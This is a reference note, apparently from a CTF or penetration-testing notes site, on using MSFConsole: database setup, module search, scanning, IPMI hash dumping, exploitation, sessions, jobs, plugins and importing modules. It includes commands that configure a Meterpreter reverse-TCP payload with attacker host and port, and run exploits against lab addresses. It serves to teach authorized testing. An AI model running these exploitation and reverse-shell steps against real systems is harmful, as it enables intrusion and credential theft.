---
title: "MSFConsole"
category: "tools"
tags: []
excerpt: "MSFConsole is the primary interface for the Metasploit Framework. It provides an interactive command-line environment..."
date: "2026-04-12"
---

---
## Overview
MSFConsole is the primary interface for the Metasploit Framework. It provides an interactive command-line environment for loading modules, configuring parameters, running scans, launching exploits, and managing active sessions. All framework functionality is accessible through MSFConsole. This note follows the logical CTF workflow from first launch through active session management.

## Target / Context
Used during the enumeration, exploitation, and post-exploitation phases of any engagement. Part of [Metasploit](/tools/Frameworks/Metasploit/Metasploit) — see that note for module types and payload reference.

---
## Installation

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Installation Commands:</span></summary>
<div class="callout-body">

MSFConsole is installed as part of Metasploit Framework:
<ul class="callout-list">
  <li><code>sudo apt install metasploit-framework</code></li>
</ul>

Initialize the database on first use:
<ul class="callout-list">
  <li><code>systemctl start postgresql</code></li>
  <li><code>msfdb init</code></li>
</ul>

</div>
</details>

---
## Basic Usage

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Basic Usage:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msfconsole</code></li>
</ul>
Verify database connection after launch:
<ul class="callout-list">
  <li><code>db_status</code></li>
</ul>

</div>
</details>

---
## Flags & Options

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags & Options:</span></summary>
<div class="callout-body">

| Flag | Description | Example |
|------|-------------|---------|
| <code>-q</code> | Quiet mode — suppress banner on launch | <code>msfconsole -q</code> |
| <code>-r <file></code> | Run a resource script on startup | <code>msfconsole -r setup.rc</code> |

</div>
</details>

---
## Common Use Cases

### Step 1 — Database Setup
Run once before starting work. The database stores scan results, hosts, and services across sessions.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>systemctl start postgresql</code></li>
  <li><code>msfdb init</code></li>
  <li><code>msfconsole</code></li>
  <li><code>db_status</code></li>
</ul>

Create a workspace to keep engagement data organized:
<ul class="callout-list">
  <li><code>workspace -a <name></code></li>
</ul>
<code>workspace</code> — list all workspaces
<code>workspace <name></code> — switch to a workspace
<code>workspace -h</code> — show workspace help

</div>
</details>

---

### Step 2 — Navigation
Finding and loading modules.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>help</code> — show all available commands
<code>history</code> — show command history
<code>search <term></code> — search modules by keyword
<code>search type:auxiliary telnet</code> — filter by module type and keyword
<code>search cve:2017-0144</code> — search by CVE number
<code>use <module path></code> — load a module by full path
<code>use <number></code> — load a module by search result number
<code>info</code> — show full details about the loaded module
<code>show options</code> — display all configurable parameters for the module
<code>show payloads</code> — list compatible payloads for the current exploit
<code>back</code> — unload current module and return to root prompt

</div>
</details>

---

### Step 3 — Setting Parameters
Configure the module before running it.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>set RHOSTS 10.10.10.1</code> — set target IP
<code>set RHOSTS 10.10.10.0/24</code> — set target subnet
<code>set RHOSTS file:/path/to/targets.txt</code> — load targets from file
<code>set RPORT 445</code> — set target port
<code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code> — set payload
<code>set payload <number></code> — set payload by number from <code>show payloads</code>
<code>set LHOST 10.10.10.5</code> — set attacker IP
<code>set LPORT 4444</code> — set attacker listening port
<code>set SESSION 1</code> — set session for post-exploitation modules
<code>setg RHOSTS 10.10.10.1</code> — set globally across all modules
<code>unset <parameter></code> — clear a single parameter
<code>unset all</code> — clear all parameters for the current module
<code>unsetg <parameter></code> — clear a global parameter
<code>show options</code> — verify all parameters are set correctly before running

Note: Parameters reset when switching modules. Use <code>setg</code> to persist values globally.

</div>
</details>

---

### Step 4 — Scanning
Discover hosts, open ports, and services using auxiliary modules before exploiting.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>search portscan</code> — find available port scan modules
<ul class="callout-list">
  <li><code>use auxiliary/scanner/portscan/tcp</code></li>
  <li><code>set RHOSTS 10.10.10.0/24</code></li>
  <li><code>set PORTS 1-1000</code></li>
  <li><code>set THREADS 10</code></li>
  <li><code>run</code></li>
</ul>

UDP sweep:
<ul class="callout-list">
  <li><code>use auxiliary/scanner/discovery/udp_sweep</code></li>
</ul>

SMB enumeration:
<ul class="callout-list">
  <li><code>use auxiliary/scanner/smb/smb_enumshares</code></li>
  <li><code>use auxiliary/scanner/smb/smb_version</code></li>
  <li><code>use auxiliary/scanner/smb/smb_login</code></li>
</ul>

MSSQL discovery:
<ul class="callout-list">
  <li><code>use auxiliary/scanner/mssql/mssql_ping</code></li>
</ul>

IPMI version and hash dumping:
<ul class="callout-list">
  <li><code>use auxiliary/scanner/ipmi/ipmi_version</code></li>
  <li><code>use auxiliary/scanner/ipmi/ipmi_dumphashes</code></li>
  <li><code>set OUTPUT_JOHN_FILE ipmi.john</code></li>
  <li><code>run</code></li>
</ul>
— Exploits the RAKP flaw: the server returns a password hash for any valid username; crack offline with Hashcat (-m 7300) or JohnTheRipper (--format=rakp)

You can also run Nmap directly from within MSFConsole:
<ul class="callout-list">
  <li><code>db_nmap -sV 10.10.10.1</code></li>
</ul>
Results are automatically stored in the database.

</div>
</details>

---

### Step 5 — Database Workflow
Use the database to manage discovered hosts and services and feed them directly into modules.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>hosts</code> — list all discovered hosts
<code>hosts -R</code> — set RHOSTS to all hosts in the database
<code>hosts -h</code> — show hosts command help
<code>services</code> — list all discovered services
<code>services -S <name></code> — filter services by name (e.g., <code>services -S smb</code>)
<code>services -h</code> — show services command help

Efficient workflow:
<code>db_nmap -sV 10.10.10.0/24</code> → review hosts → <code>use</code> vulnerability module → <code>hosts -R</code> → <code>exploit</code>

</div>
</details>

---

### Step 6 — Running Exploits
Launch the configured module against the target.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>exploit</code> — run the exploit and wait for a session
<code>run</code> — alias for exploit
<code>exploit -z</code> — run exploit and immediately background any resulting session
<code>check</code> — test whether the target is vulnerable without exploiting (supported modules only)

If the exploit succeeds, a session opens automatically.

</div>
</details>

---

### Step 7 — Session Management
Manage multiple active sessions after exploitation.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>background</code> — send active session to background (also <code>CTRL+Z</code> from Meterpreter)
<code>sessions</code> — list all active sessions
<code>sessions -i <number></code> — interact with a specific session
<code>sessions -k <number></code> — kill a session

After interacting with a session, see [Meterpreter](/tools/Frameworks/Metasploit/Meterpreter) for post-exploitation commands.

</div>
</details>

---

### Jobs
Run an exploit as a background job to keep the prompt free for other work, or to manage multiple exploit listeners simultaneously.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>exploit -j</code> — run the current exploit as a background job instead of blocking the console
<code>jobs -l</code> — list all active background jobs
<code>jobs -K</code> — kill all running jobs
<code>kill <number></code> — kill a specific job by number
<code>jobs -h</code> — show job command help

Jobs are distinct from sessions: a job is an active listener or running module in the background, not yet an established session. Once the target connects, the job becomes a session.

</div>
</details>

---

### Plugins
Plugins extend MSFConsole with third-party tool integrations and automation utilities. They interact directly with the Metasploit API and add new commands to the console after loading.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

Check installed plugins:
<ul class="callout-list">
  <li><code>ls /usr/share/metasploit-framework/plugins</code></li>
</ul>

Load a plugin:
<code>load <name></code> — e.g., <code>load nessus</code>
After loading, run <code>help</code> to see the new commands added by the plugin.

Install a new plugin manually (example — Darkoperator's plugin set):
<ul class="callout-list">
  <li><code>git clone https://github.com/darkoperator/Metasploit-Plugins</code></li>
  <li><code>sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb</code></li>
</ul>
Then from within MSFConsole: <code>load pentest</code>

Popular third-party plugins not pre-installed:
Railgun (Windows post-exploitation via WinAPI): https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation
Darkoperator's plugin collection: https://github.com/darkoperator/Metasploit-Plugins

</div>
</details>

---

### Writing & Importing Modules
Custom or community-written `.rb` exploit modules can be imported into Metasploit without a full framework update. Only `.rb` files can be loaded — Metasploit modules are Ruby.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

Search ExploitDB for Metasploit-tagged exploits from the CLI:
<ul class="callout-list">
  <li><code>searchsploit <keyword></code></li>
</ul>
Filter results to the "Metasploit Framework" tag to find <code>.rb</code> files ready for import.

Copy a downloaded module into the framework:
<ul class="callout-list">
  <li><code>cp ~/Downloads/exploit.rb /usr/share/metasploit-framework/modules/exploits/<os>/<service>/exploit_name.rb</code></li>
</ul>

Naming convention: snake_case, alphanumeric and underscores only — no dashes.
Example: <code>nagios3_command_injection.rb</code>

Load an additional module directory at startup:
<ul class="callout-list">
  <li><code>msfconsole -m /path/to/modules/</code></li>
</ul>

Load an additional path from within MSFConsole:
<ul class="callout-list">
  <li><code>loadpath /usr/share/metasploit-framework/modules/</code></li>
</ul>
<code>reload_all</code> — force-reload all modules from all known paths

Modules merged into the official <code>metasploit-framework</code>
GitHub branch are auto-imported when the framework is updated via <code>apt</code>.

</div>
</details>

---
## Related Techniques
-

## Related Playbooks
- [Red Team](/playbooks/Methodologies/Red-Team)

---
## References / Images
- Metasploit Framework Docs: https://adfoster-r7.github.io/metasploit-framework/
- Metasploit Unleashed: https://www.offsec.com/metasploit-unleashed/
- Metasploit Module Development Guide: https://www.rapid7.com/blog/post/2012/07/05/part-1-metasploit-module-development-the-series/
- The Metasploit Book: https://nostarch.com/metasploit
